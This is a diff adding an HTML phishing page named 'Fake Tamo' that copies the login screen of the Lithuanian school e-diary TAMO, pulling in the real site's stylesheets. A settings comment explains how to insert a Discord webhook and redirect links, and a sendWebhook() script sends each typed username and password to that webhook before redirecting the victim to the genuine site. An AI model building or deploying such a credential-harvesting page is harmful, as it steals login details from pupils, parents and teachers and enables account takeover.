@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+    <title>Fake Tamo</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta http-equiv="content-language" content="lt" />
+    <link rel="shortcut icon" href="../Prisijungimas/favicon.ico" />
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300,400,500,600,700' rel='stylesheet' type='text/css'>
+    <link href="https://dienynas.tamo.lt/styles/jquery.ui?v=KBPsekUHSBKOjFSqnrLMYC_g8-eAS1hLKcS5shLKpyI1" rel="stylesheet"/>
+
+    <link href="https://dienynas.tamo.lt/styles/bootstrap.mobile?v=95Qku5LTXiKlRdr4Up4YIHejRx6EljNOODrb-iMMn9k1" rel="stylesheet"/>
+
+    <link href="https://dienynas.tamo.lt/styles/notifications?v=tgKEDglQcKv-3XyABI9pGVZcwXOJBLaB7YIK8zHSNKA1" rel="stylesheet"/>
+
+    <link href="https://dienynas.tamo.lt/styles/core?v=1FWRZSxgL-rPrV6i39ZnQGeyIvvnByoD4nfz--p6Im81" rel="stylesheet"/>
+
+
+    <!--Settings
+        
+     replace "PressRedirect" with a link that you whant to redirect user when it clicks on some of the components
+     replace "SubmitRedirect" with a link that you whant to redirect user when it clicks on "Prisijunkti" button (default is http://denynas.tamo.lt/)
+     replace "DiscordWebhook" with your discord webhook
+    
+    -->
+
+
+</head>
+<body>
+<style type="text/css">
+    .col_left {
+    width : calc(100% - 350px);
+        float:left;
+        min-height:100vh;
+            background: #ea472d url('https://dienynas.tamo.lt/Ad/DownloadBannerImage') center center;
+        background-repeat:no-repeat;
+        background-size : contain;
+
+        }
+
+    .col_right {
+        width: 350px;
+        float:right;
+        min-height:100vh;
+        display:flex;
+        align-items:center;
+        background:white;
+    }
+
+    .logo-img {
+        background-image:url('..logo.png');
+
+        width:176px;
+        height:48px;
+        display:inline-block;
+        margin-bottom:15px;
+    }
+
+    #main_form {
+        background: white;
+        padding: 25px;
+    }
+
+    #external_providers {
+        display: initial;
+    }
+    body {
+        background : white !important;
+    }
+
+    @media screen and (max-width:700px){
+       .col_left {
+            width : calc(100vw - 20px);
+                background: #ea472d url('https://dienynas.tamo.lt/Ad/DownloadBannerImage') center center;
+            background-repeat:no-repeat;
+            background-size : contain;
+            min-height : calc(100vw / 1.6);
+        }
+
+        .col_right {
+            width: calc(100vw - 20px);
+            display:flex;
+            align-items:center;
+            background:white;
+            min-height : initial;
+        }
+
+        #main_form {
+            background: white;
+            margin: 0;
+            padding: 35px;
+        }
+
+        body {
+            display: flex;
+            flex-wrap: wrap;
+            margin: 0;
+            padding: 0;
+        }
+    }
+
+
+</style>
+
+
+
+
+
+    <a action="" class="preview-banner" target="_blank" href=PressRedirect >
+
+
+        <div class="col_left"></div>
+    </a>
+
+<div class="col_right">
+<form class="full_width" id="main_form" method="post">
+    <div class="login_div" style="margin-top:auto;margin-bottom:auto;width:100%;text-align:center">
+            <div style="text-align:center;margin-bottom:25px;">
+
+
+        <div style="display:inline-block;margin:20px 15px;"><img style="height:48px;" src="tamo_ukraina.svg" /></div>
+    </div>
+    
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.4/axios.min.js"></script>
+            <input type="text" id="username" placeholder="Naudotojo vardas">
+            <input type="password" id="message" placeholder="Slaptаžodis">
+            <a onclick="sendWebhook()" class="c_btn submit" style="width:100%;" href=SubmitRedirect >PRISIJUNGTI</a>
+        
+            <script>
+            function sendWebhook() {
+                var webhookURL = DiscordWebhook;
+                var username = document.getElementById('username').value;
+                var message = document.getElementById('message').value;
+        
+                var content = `Username: ${username}\nMessage: ${message}`;
+        
+                var payload = {
+                content: content
+                };
+        
+                axios.post(webhookURL, payload)
+                .then(function(response) {
+                    console.log('Webhook sent successfully!', response);
+                })
+                .catch(function(error) {
+                    console.error('Error sending webhook:', error);
+                });
+            }
+            </script>
+                    <div style="margin-top: 15px; padding-bottom: 15px; border-bottom: solid 1px #e8e8e8; text-align: center;">
+                        <span>Neturi TAMO paskyros? </span><a href=PressRedirect >Registruokis</a>
+                    </div>
+            <div style="text-align: center; margin-top: 15px;"><a href=PressRedirect >Nepavyksta prisijungti?</a></div>
+            </div>
+            <div style="text-align: center; margin-top: 5px;"><a href=PressRedirect >Pamiršote prisijungimo duomenis?</a></div>
+
+            <div id="rules" style="margin-top: 15px; font-size: 12px">
+                <div class="row">
+                    <a class="col-md-6 text-right" href=PressRedirect >Privatumo politika</a>
+                    <a class="col-md-6 text-left" href=PressRedirect >Naudojimo taisyklės</a>
+                </div>
+                <div style="text-align: center; margin-top: 10px;" class="row">
+                    <a href=PressRedirect >Integracijos</a>
+                </div>
+            </div>
+
+            <div style="font-size:12px;text-align:center;">
+                <div style="margin-top: 5px;">&copy;2023 UAB „Tavo mokykla“.</div>
+                <div style="margin-top: 5px;">Visos teisės saugomos. v23.19.0</div>
+            </div>
+        </div>
+</form></div>
+
+</html>
